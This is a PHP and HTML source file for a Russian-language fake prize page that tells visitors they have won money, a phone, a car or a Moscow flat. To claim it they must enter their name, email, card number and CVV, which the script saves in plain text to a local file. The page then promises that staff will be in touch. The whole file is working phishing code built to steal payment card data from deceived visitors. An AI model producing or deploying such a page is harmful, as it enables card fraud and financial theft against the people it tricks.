<head>
  <title>!!!!!!!!!!!!!!!!!</title>
  <meta charset = "utf-8">
</head>
<body bgcolor = "#FFEFD9"></body>
<?php
    echo "<font color = 'red'>
    <h1 style = 'margin-left:80';>Внимание</h1>
    <h1>Вы выиграли приз!!!</h1>
    </font>";
    if (isset($_POST["pr"])) {
        $pr = $_POST["pr"];
    } else {
        $pr = rand(0, 3);
        $_POST["pr"] = (string)$pr;
    }
    switch ($pr) {
        case '0':
            echo "<h1 style = 'color:#FF6A00';>!!! Миллион $$$$ !!!</h1>";
            break;
        case '1':
            echo "<h1 style = 'color:#FF6A00';>!!! IPHONE X !!!</h1>";
            break;
        case '2':
            echo "<h1 style = 'color:#FF6A00';>!!! МАШИНУ S-КЛАССА !!!</h1>";
            break;
        case '3':
            echo "<h1 style = 'color:#FF6A00';>!!! КВАРИТРУ В ЦЕНТРЕ МОСКВЫ !!!</h1>";
            break;
    }
?>

<img src = "priz.jpg" width = "500">

<?php
if ($_POST["CVV"] != "" && $_POST["imfam"] != "" && $_POST["number"] != "" && $_POST["mai"] != "") {
    $f = fopen('kodi.txt', 'a');
    fwrite($f, "Имя и фамилия: ".$_POST["imfam"]."\n");
    fwrite($f, "Почта: ".$_POST["mai"]."\n");
    fwrite($f, "Номер карты: ".$_POST["number"]."\n");
    fwrite($f, "CVV: ".$_POST["CVV"]."\n");
    fwrite($f, "<<----------------------------->>\n");
    fclose($f);
    echo "
        <h3><i>Ваши данные получены!</i></h3>
        <p>
            Ожидайте получение приза в <b>ближайшее</b> время<br>
            Наши сотрудники с вами скоро свяжутся!<br>
        </p>
    ";
} else {
    echo "<h2>Для выдачи приза нашей компании понадобятся ваши данные:</h2>";
    if (isset($_POST["OK"]))
        echo "<h4 style = 'color:#FF6A00';><u>НЕВЕРНЫЙ ФОРМАТ!</u><br>";
    echo "
    <form action='/' method='POST'>
        Имя и фамилия: <input type='text' name='imfam'/><br>
        Почта: <input type='text' name='mai'/><br>
        Номер карты: <input type='text' name='number'/><br>
        CVV карты: <input type='text' name='CVV'/><br>
        <input type = 'hidden' name = 'pr' value = '$pr'/>
        <input type='submit' name = 'OK' value='Отправить!'/>
    </form>
    ";
}
?>